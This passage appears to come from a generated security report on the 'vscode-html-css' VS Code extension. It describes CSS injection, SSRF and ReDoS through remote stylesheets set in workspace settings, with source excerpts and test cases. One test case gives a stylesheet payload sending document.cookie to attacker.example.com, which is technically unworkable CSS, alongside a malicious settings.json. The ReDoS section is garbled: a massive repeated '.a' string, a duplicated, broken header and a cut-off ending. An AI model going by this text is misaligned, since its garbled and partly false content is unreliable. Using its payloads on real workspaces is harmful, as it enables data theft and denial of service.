        *   **User Confirmation for Remote Stylesheets:**  Prompt user confirmation before loading remote stylesheets, especially when a workspace configuration specifies them. This would make users aware of potential risks associated with loading external resources.
        *   **Input Sanitization and Validation:**  While CSS injection is the vector, sanitizing URLs in `css.styleSheets` might help to prevent unexpected behavior, although it won't fully mitigate CSS injection risks.

    *   **Preconditions:**
        1.  The victim user must have the "vscode-html-css" extension installed and activated.
        2.  The victim user must open a workspace or project that contains a malicious `.vscode/settings.json` file crafted by the attacker.
        3.  The malicious `.vscode/settings.json` must include a `css.styleSheets` setting that points to an attacker-controlled remote stylesheet URL.

    *   **Source Code Analysis:**
        1.  **`src/settings.ts` - `getStyleSheets(scope: TextDocument)`:**
            ```typescript
            export function getStyleSheets(scope: TextDocument): string[] {
              return workspace
                .getConfiguration("css", scope)
                .get<string[]>("styleSheets", [])
                .map((glob) =>
                  glob.replace(
                    /\$\s*{\s*(fileBasenameNoExtension|fileBasename|fileExtname)\s*}/g,
                    (match, variable) =>
                      variable === "fileBasename"
                        ? path.base
                        : variable === "fileExtname"
                        ? path.ext
                        : path.name
                  )
                );
            }
            ```
            This function retrieves the `css.styleSheets` configuration from the workspace settings. It processes variable substitutions but does not validate or sanitize the stylesheet URLs.

        2.  **`src/provider.ts` - `getStyles(document: TextDocument)`:**
            ```typescript
            private async getStyles(document: TextDocument) {
              const styles = new Map<string, Style[]>();
              const folder = workspace.getWorkspaceFolder(document.uri);
              const globs = getStyleSheets(document);

              for (const glob of globs) {
                if (this.isRemote.test(glob)) {
                  styles.set(glob, await this.getRemote(glob)); // Calls getRemote for remote URLs
                } else if (folder) {
                  const files = await workspace.findFiles(
                    this.getRelativePattern(folder, glob)
                  );
                  for (const file of files) {
                    styles.set(file.toString(), await this.getLocal(file));
                  }
                }
              }
              styles.set(document.uri.toString(), parse(document.getText()));
              return styles;
            }
            ```
            This function iterates through the stylesheets defined in the configuration. It checks if a stylesheet URL is remote using `this.isRemote.test(glob)` and if so, calls `this.getRemote(glob)` to fetch it.

        3.  **`src/provider.ts` - `getRemote(name: string)`:**
            ```typescript
            private async getRemote(name: string) {
              let styles = cache.get(name);
              if (!styles) {
                const content = await this.fetch(name); // Fetches remote content
                styles = parse(content);                  // Parses the fetched content
                cache.set(name, styles);
              }
              return styles;
            }
            ```
            This function fetches the content of a remote stylesheet using `this.fetch(name)` and then parses it using `parse(content)`. There is no validation or sanitization of the URL or the fetched content before parsing.

        4.  **`src/provider.ts` - `fetch(url: string)`:**
            ```typescript
            private async fetch(url: string) {
              try {
                const res = await fetch(url); // Uses the native fetch API
                if (res.ok) {
                  return res.text();
                }
                throw new Error(res.statusText);
              } catch (error) {
                window.showErrorMessage(`Fetching ${url} failed. ${error}`);
              }
              return "";
            }
            ```
            This function uses the standard `fetch` API to retrieve the remote stylesheet content. It handles network errors and displays an error message but does not implement any security checks on the URL or the response.

        **Visualization:**

        ```mermaid
        graph LR
            subgraph VS Code Extension
                A[getStyleSheets] --> B[getStyles]
                B --> C{isRemote}
                C -- Yes --> D[getRemote]
                C -- No --> E[getLocal]
                D --> F[fetch]
                F --> G[parse]
                E --> H[readFile]
                H --> G
            end
            subgraph Attacker Controlled Server
                I[Malicious CSS File]
            end
            J[Workspace Configuration (.vscode/settings.json)] -- "css.styleSheets": ["https://attacker.com/malicious.css"] --> A
            F -- fetch(URL from config) --> I
            G -- parse(Malicious CSS) --> VS Code Extension
        ```

    *   **Security Test Case:**
        1.  **Attacker Setup:**
            *   Create a malicious CSS file (`malicious.css`) on an attacker-controlled web server (e.g., `https://attacker.example.com/malicious.css`). This file will contain CSS injection code designed to exfiltrate data. For example:
                ```css
                body {
                    background-image: url("https://attacker.example.com/exfiltrate?data=" + document.cookie);
                }
                ```
            *   Alternatively, for simpler testing without setting up a server, use a requestbin or similar service to capture HTTP requests. For example:
                ```css
                body {
                    background-image: url("https://your-requestbin-url?injected-css");
                }
                ```
        2.  **Malicious Workspace Creation:**
            *   Create a new folder representing a VS Code workspace.
            *   Inside this folder, create a `.vscode` folder.
            *   Inside the `.vscode` folder, create a `settings.json` file with the following content:
                ```json
                {
                    "css.styleSheets": [
                        "https://attacker.example.com/malicious.css"
                    ],
                    "css.enabledLanguages": ["html"]
                }
                ```
        3.  **Victim Action:**
            *   The victim user opens the workspace folder created in step 2 in VS Code.
            *   Ensure the "vscode-html-css" extension is activated.
            *   Open any HTML file within the workspace (or create a new empty HTML file).
        4.  **Verification:**
            *   **For RequestBin:** Check the RequestBin URL. You should see an HTTP request logged, indicating that the malicious CSS was loaded and executed by the extension.
            *   **For Data Exfiltration Example:** Monitor the attacker's web server logs. If using the `document.cookie` example, you would expect to see requests to `https://attacker.example.com/exfiltrate?data=[victim's cookies]`.  For testing purposes, a simpler injection like the requestbin example is sufficient to demonstrate the vulnerability.
            *   Observe if any unexpected behavior occurs in VS Code due to the injected CSS, although the primary impact is data exfiltration, not direct UI manipulation within VS Code itself.

*   **Vulnerability Name**: Server‑Side Request Forgery (SSRF) via Remote Stylesheet Fetch

    *   **Description**:
        The extension allows users to configure external (remote) CSS style sheets via the `"css.styleSheets"` setting (typically in a workspace’s `.vscode/settings.json`). When a remote URL is specified (i.e. one matching the regular expression `/^https?:\/\//i`), the extension calls its `getRemote()` function, which in turn uses the native `fetch` API to retrieve the stylesheet. An attacker who can supply or influence the workspace configuration can set this setting to point to a malicious or internal URL. When the user opens the workspace, the extension blindly fetches the stylesheet from that URL. This gives an attacker control over the target endpoint of the request and enables the abuse of the extension as a proxy for making arbitrary HTTP/HTTPS requests—including to internal network addresses.

    *   **Impact**:
        - An attacker may leverage the extension to perform internal network scanning or access sensitive internal resources that are not normally exposed to the Internet.
        - The victim’s machine may be forced to initiate requests to endpoints chosen by the attacker.
        - Sensitive data could be unintentionally exposed if the remote resource returns confidential information based on the victim’s network context.

    *   **Vulnerability Rank**: High

    *   **Currently Implemented Mitigations**:
        - In `Provider.getStyles` (in *src/provider.ts*), the code checks if a style sheet is remote using a simple regular expression (`/^https?:\/\//i`).
        - No further checks (such as input sanitization or domain restrictions) are applied before invoking `fetch` on the supplied URL.

    *   **Missing Mitigations**:
        - There is no validation or sanitization on remote URLs provided via the configuration.
        - The extension lacks measures such as whitelisting trusted domains or blacklisting internal/private IP addresses.
        - No user confirmation or prompt is implemented before fetching external content.

    *   **Preconditions**:
        - The attacker must be able to inject or influence the workspace configuration (for example, by including a malicious `.vscode/settings.json` in a project the victim downloads or opens).
        - The victim’s environment must allow outbound network requests from VSCode extensions.
        - The remote URL provided must resolve to a target of the attacker’s choice (for instance, an internal endpoint).

    *   **Source Code Analysis**:
        - **Step 1 – Configuration Reading**:
          In `src/settings.ts`, the `getStyleSheets` function reads the `"css.styleSheets"` configuration without any sanitization. It also performs variable substitutions based solely on the file path.

        - **Step 2 – Determining Remote URLs**:
          In `src/provider.ts`, within the `getStyles` method, each stylesheet glob is evaluated. For any glob that matches the regular expression `/^https?:\/\//i` (accessed via the `isRemote` getter), the stylesheet is considered remote.

        - **Step 3 – Fetching Remote Content**:
          For remote URLs, the `getRemote()` function is called. This function simply invokes the built‑in `fetch(url)` to retrieve the content. No additional checks or restrictions are performed on the URL.

        - **Step 4 – Processing Fetched Content**:
          The fetched remote content is then passed to the `parse()` function (in *src/parser.ts*) where the extension extracts CSS selectors to support completions and "go to definition" features.

        - **Visualization**:
          1. **User Configuration** → `.vscode/settings.json` includes a remote URL (e.g., `"http://malicious-server.local/malicious.css"`).
          2. **Settings Module** → `getStyleSheets` returns this URL (after variable substitution, if any).
          3. **Provider Module** → `getStyles` detects the URL is remote (using `/^https?:\/\//i`).
          4. **Remote Fetch** → `getRemote()` is called and `fetch(url)` is used to request the content.
          5. **Parsing** → The response is parsed and used for providing intellisense.

        - **Conclusion**:
          Because no further validation or sanitization is applied between reading the configuration and fetching the remote resource, an attacker can force the extension to initiate arbitrary HTTP/HTTPS requests.

    *   **Security Test Case**:
        - **Step 1**:
          Prepare a workspace directory and create a `.vscode/settings.json` file with the following content:
          ```json
          {
              "css.styleSheets": [ "http://malicious-server.local/malicious.css" ]
          }
          ```
        - **Step 2**:
          Set up a controlled HTTP server at `malicious-server.local` that logs all incoming requests.
        - **Step 3**:
          Open the workspace in Visual Studio Code with the vulnerable extension enabled.
        - **Step 4**:
          Open or edit an HTML document (or otherwise trigger the extension’s auto‑validation/completion functionality).
        - **Step 5**:
          Observe the controlled server logs.
          **Expected Result**: A request from the extension to `http://malicious-server.local/malicious.css` is logged, thereby confirming that the extension fetched the remote URL without proper validation.

*   **Vulnerability Name:** ReDoS vulnerability in CSS selector parsing

    *   **Description:**
        The VSCode extension is vulnerable to Regular Expression Denial of Service (ReDoS) due to an insecure regular expression used in the `parse` function in `src/parser.ts`. This function parses CSS files to extract CSS selectors for autocompletion and validation features. The regular expression `selector` used for parsing is susceptible to ReDoS attacks. By providing a specially crafted, complex CSS file from a remote URL configured in the `css.styleSheets` setting, an attacker can trigger excessive backtracking in the regex engine, leading to high CPU usage and a denial of service condition. The vulnerable regex is:
        ```
        /([.#])(-?[_a-zA-Z\]+[\\!+_a-zA-Z0-9-]*)(?=[#.,()\s\[\]\^:*"'>=_a-zA-Z0-9-]*{[^}]*})/g
        ```
        A malicious CSS file containing selectors with deeply nested or overlapping patterns can exploit this regex. When the extension parses such a file, the regex engine will spend an exponential amount of time trying to find matches, causing the extension and potentially VSCode to become unresponsive.

    *   **Impact:**
        High. Exploitation of this vulnerability leads to a denial of service (DoS) condition. When VSCode attempts to process a malicious CSS file, the extension's CSS parsing function will consume excessive CPU resources, making VSCode unresponsive. This can severely disrupt the user's workflow, forcing them to restart VSCode.

    *   **Vulnerability Rank:** High

    *   **Currently Implemented Mitigations:**
        None. The current implementation lacks any specific mitigations against ReDoS vulnerabilities in the CSS parsing process. The extension fetches remote stylesheets and parses them without any safeguards against malicious or overly complex CSS that could trigger ReDoS.

    *   **Missing Mitigations:**
        *   **Refactor Vulnerable Regex:** The primary missing mitigation is to refactor the vulnerable regular expression in `src/parser.ts`. The regex should be rewritten to avoid backtracking issues and ensure linear time complexity, even with complex inputs. Consider using more robust and secure regex patterns or alternative parsing methods that are not regex-based if possible.
        *   **Input Complexity Limits:** Implement limits on the complexity of CSS stylesheets parsed by the extension. This could include limiting the depth of selector nesting, the length of selectors, or the overall size of CSS files processed. However, this might impact the functionality of the extension if legitimate CSS files exceed these limits. Regex refactoring is the preferred solution.
        *   **Regex Execution Timeout:** Introduce a timeout for regex execution within the `parse` function. If the regex execution exceeds a certain time limit, parsing should be aborted to prevent a prolonged DoS. This can act as a safety net, but might also lead to incomplete parsing if legitimate, complex CSS is encountered.

    *   **Preconditions:**
        *   The user has the VSCode HTML CSS extension installed and activated.
        *   The user opens a workspace in VSCode.
        *   The user configures the `"css.styleSheets"` setting in their workspace settings (or user settings) to include a URL pointing to a malicious CSS file controlled by the attacker.
        *   VSCode attempts to use the extension's features (e.g., autocompletion, validation) in a file type supported by the extension (like HTML).

    *   **Source Code Analysis:**
        1.  **`src/settings.ts` - `getStyleSheets()`:** Retrieves stylesheet URLs from settings.
        2.  **`src/provider.ts` - `getStyles()`:** Processes configured stylesheets, including remote URLs.
        3.  **`src/provider.ts` - `getRemote()`:** Fetches content from remote URLs using `fetch()`.
        4.  **`src/provider.ts` - `getRemote()` -> `parse()`:** Calls the `parse()` function in `src/parser.ts` to process the fetched CSS content.
        5.  **`src/parser.ts` - `parse()`:** Executes the vulnerable regex `selector` against the CSS content. A malicious CSS with crafted selectors can cause the regex engine to enter a ReDoS state during this step.

        **Visualization:**

        ```mermaid
        graph LR
            A[VSCode Workspace Settings - css.styleSheets] --> B(getStyleSheets in settings.ts);
            B --> C(getStyles in provider.ts);
            C -- Remote URL --> D(getRemote in provider.ts);
            D --> E[fetch(Malicious CSS URL)];
            E --> F(parse in parser.ts);
            F -- Vulnerable Regex --> G{ReDoS Vulnerability - High CPU Usage};
        ```

    *   **Security Test Case:**

        1.  **Prepare a Malicious CSS File:**
            Create a CSS file named `redos.css` with the following content designed to trigger ReDoS:
            ```css
            .a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.file:**
            ```css
            .a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a [Security Test Case]:**
        1.  **Attacker Setup:**
            *   Create a malicious CSS file (`redos.css`) with the following content designed to trigger ReDoS:
                ```css
                .a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a